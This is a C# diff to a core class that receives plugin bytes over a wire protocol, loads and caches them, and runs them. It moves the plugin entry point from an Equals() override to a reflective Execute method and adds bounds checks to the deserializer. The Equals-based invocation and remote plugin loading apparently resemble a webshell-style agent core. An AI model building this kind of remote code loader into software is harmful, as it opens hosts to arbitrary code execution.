@@ -5,6 +5,7 @@ using System.Collections.Generic;
 using System.IO;
 using System.Linq;
 using System.Reflection;
+using System.Text;
 
 namespace dotnet_core
 {
@@ -21,6 +22,10 @@ namespace dotnet_core
         private const string CLASS_RUN = "classRun";
         private const string PLUGIN_CACHES = "pluginCaches";
         private const string GLOBAL_CACHES = "globalCaches";
+        // Plugin contract v2: plugins implement
+        // object Execute(IDictionary<string, object> ctx) and return their
+        // result. No result key is written back into ctx.
+        private const string PLUGIN_EXECUTE = "Execute";
 
         private const string ACTION_STATUS = "status";
         private const string ACTION_RUN = "run";
@@ -48,7 +53,14 @@ namespace dotnet_core
         private const byte LIST = 0x07;
         private const byte OBJECT_ARRAY = 0x08;
         private const byte SET = 0x09;
+        // Strings whose modified UTF-8 representation exceeds MAX_UTF_LENGTH bytes
+        // are written with an int length and standard UTF-8 instead of writeUTF.
+        private const byte LONG_STRING = 0x0A;
         private const byte MAP = 0x10;
+        private const int MAX_UTF_LENGTH = 0xffff;
+        // Initial capacity cap for collections read from the wire, so a malicious
+        // size prefix cannot trigger a huge eager allocation.
+        private const int INITIAL_CAPACITY_LIMIT = 1024;
 
         public override bool Equals(object obj)
         {
@@ -107,7 +119,7 @@ namespace dotnet_core
                                     {
                                         Dictionary<string, object> shutdownCtx = new Dictionary<string, object>();
                                         shutdownCtx["op"] = "shutdown";
-                                        entry.Value.Equals(shutdownCtx);
+                                        InvokeExecute(entry.Value, shutdownCtx);
                                     }
                                     catch
                                     {
@@ -194,6 +206,7 @@ namespace dotnet_core
             if (pluginObj == null)
             {
                 pluginObj = CreatePlugin(pluginBytes);
+                ResolveExecuteMethod(pluginObj);
                 loadedPluginCache[plugin] = pluginObj;
                 loadedPluginVersionCache[plugin] = version;
                 result[CLASS_DEFINE] = true;
@@ -208,16 +221,51 @@ namespace dotnet_core
             string plugin = GetString(args, PLUGIN);
             object pluginObj = loadedPluginCache[plugin];
 
-            Dictionary<string, object> map = ToStringObjectDictionary(GetObject(args, ARGS)) ?? new Dictionary<string, object>();
-            map[PLUGIN_CACHES] = loadedPluginCache;
-            map[GLOBAL_CACHES] = globalCaches;
-            pluginObj.Equals(map);
-
-            object data = null;
-            map.TryGetValue("result", out data);
-            result[DATA] = data;
+            // Runtime values live only in this invocation's context; the
+            // request args dictionary is never mutated.
+            Dictionary<string, object> ctx = ToStringObjectDictionary(GetObject(args, ARGS)) ?? new Dictionary<string, object>();
+            ctx[PLUGIN_CACHES] = loadedPluginCache;
+            ctx[GLOBAL_CACHES] = globalCaches;
+            result[DATA] = InvokeExecute(pluginObj, ctx);
             result[CLASS_RUN] = true;
             return result;
+        }
+
+        /// <summary>
+        /// Resolves the v2 plugin entry point. Missing entry points fail at
+        /// load time with an actionable message instead of silently returning
+        /// an empty result.
+        /// </summary>
+        private static MethodInfo ResolveExecuteMethod(object pluginObj)
+        {
+            MethodInfo method = pluginObj.GetType().GetMethod(
+                PLUGIN_EXECUTE,
+                BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic,
+                null,
+                new Type[] { typeof(IDictionary<string, object>) },
+                null
+            );
+            if (method == null)
+            {
+                throw new InvalidOperationException(
+                    "plugin [" + pluginObj.GetType().FullName
+                    + "] does not implement Execute(IDictionary<string, object>); regenerate it for this core version"
+                );
+            }
+            return method;
+        }
+
+        private static object InvokeExecute(object pluginObj, IDictionary<string, object> ctx)
+        {
+            try
+            {
+                return ResolveExecuteMethod(pluginObj).Invoke(pluginObj, new object[] { ctx });
+            }
+            catch (TargetInvocationException e)
+            {
+                Exception cause = e.InnerException ?? e;
+                throw new InvalidOperationException("plugin execute failed: " + cause.Message, cause);
+            }
         }
 
         public static byte[] ToByteArray(Stream input)
@@ -455,8 +503,7 @@ namespace dotnet_core
             string str = obj as string;
             if (str != null)
             {
-                output.WriteByte(STRING);
-                WriteUtf(output, str);
+                WriteString(output, str);
                 return;
             }
 
@@ -575,13 +622,9 @@ namespace dotnet_core
 
         private Dictionary<string, object> ReadMap(Stream input)
         {
-            int size = ReadInt32(input);
-            if (size < 0)
-            {
-                throw new IOException("Map size can not be negative.");
-            }
+            int size = ReadCollectionSize(input, "map");
 
-            Dictionary<string, object> map = new Dictionary<string, object>(size);
+            Dictionary<string, object> map = new Dictionary<string, object>(Math.Min(size, INITIAL_CAPACITY_LIMIT));
             for (int i = 0; i < size; i++)
             {
                 string key = ReadUtf(input);
@@ -600,6 +643,8 @@ namespace dotnet_core
                     return null;
                 case STRING:
                     return ReadUtf(input);
+                case LONG_STRING:
+                    return ReadLongString(input);
                 case INTEGER:
                     return ReadInt32(input);
                 case LONG:
@@ -620,11 +665,7 @@ namespace dotnet_core
                     }
                 case SET:
                     {
-                        int setSize = ReadInt32(input);
-                        if (setSize < 0)
-                        {
-                            throw new IOException("Set size can not be negative.");
-                        }
+                        int setSize = ReadCollectionSize(input, "set");
                         OrderedSet set = new OrderedSet();
                         for (int i = 0; i < setSize; i++)
                         {
@@ -634,12 +675,8 @@ namespace dotnet_core
                     }
                 case LIST:
                     {
-                        int listSize = ReadInt32(input);
-                        if (listSize < 0)
-                        {
-                            throw new IOException("List size can not be negative.");
-                        }
-                        List<object> list = new List<object>(listSize);
+                        int listSize = ReadCollectionSize(input, "list");
+                        List<object> list = new List<object>(Math.Min(listSize, INITIAL_CAPACITY_LIMIT));
                         for (int i = 0; i < listSize; i++)
                         {
                             list.Add(ReadObject(input));
@@ -648,11 +685,7 @@ namespace dotnet_core
                     }
                 case OBJECT_ARRAY:
                     {
-                        int arrayLength = ReadInt32(input);
-                        if (arrayLength < 0)
-                        {
-                            throw new IOException("Array length can not be negative.");
-                        }
+                        int arrayLength = ReadCollectionSize(input, "array");
                         object[] array = new object[arrayLength];
                         for (int i = 0; i < arrayLength; i++)
                         {
@@ -689,8 +722,20 @@ namespace dotnet_core
             return (byte)value;
         }
 
+        private static string ReadLongString(Stream input)
+        {
+            int length = ReadInt32(input);
+            byte[] bytes = ReadBytes(input, length);
+            return Encoding.UTF8.GetString(bytes);
+        }
+
         private static byte[] ReadBytes(Stream input, int length)
         {
+            if (length < 0)
+            {
+                throw new IOException("Length can not be negative: " + length);
+            }
+            RequireRemaining(input, length);
             byte[] bytes = new byte[length];
             int offset = 0;
             while (offset < length)
@@ -703,6 +748,40 @@ namespace dotnet_core
                 offset += read;
             }
             return bytes;
+        }
+
+        private static int Remaining(Stream input)
+        {
+            if (!input.CanSeek)
+            {
+                return int.MaxValue;
+            }
+            long remaining = input.Length - input.Position;
+            return remaining > int.MaxValue ? int.MaxValue : (int)remaining;
+        }
+
+        private static void RequireRemaining(Stream input, int length)
+        {
+            if (length < 0)
+            {
+                throw new IOException("Length can not be negative: " + length);
+            }
+            int remaining = Remaining(input);
+            if (length > remaining)
+            {
+                throw new IOException("Declared length " + length + " exceeds remaining " + remaining + " bytes");
+            }
+        }
+
+        private static int ReadCollectionSize(Stream input, string what)
+        {
+            int size = ReadInt32(input);
+            if (size < 0)
+            {
+                throw new IOException("Negative " + what + " size: " + size);
+            }
+            RequireRemaining(input, size);
+            return size;
         }
 
         private static void WriteInt32(Stream output, int value)
@@ -755,6 +834,24 @@ namespace dotnet_core
         {
             long bits = ReadInt64(input);
             return BitConverter.Int64BitsToDouble(bits);
+        }
+
+        private static void WriteString(Stream output, string value)
+        {
+            byte[] utfBytes = EncodeModifiedUtf8(value);
+            if (utfBytes.Length <= MAX_UTF_LENGTH)
+            {
+                output.WriteByte(STRING);
+                output.WriteByte((byte)((utfBytes.Length >> 8) & 0xFF));
+                output.WriteByte((byte)(utfBytes.Length & 0xFF));
+                output.Write(utfBytes, 0, utfBytes.Length);
+                return;
+            }
+
+            byte[] bytes = Encoding.UTF8.GetBytes(value);
+            output.WriteByte(LONG_STRING);
+            WriteInt32(output, bytes.Length);
+            output.Write(bytes, 0, bytes.Length);
         }
 
         private static void WriteUtf(Stream output, string value)
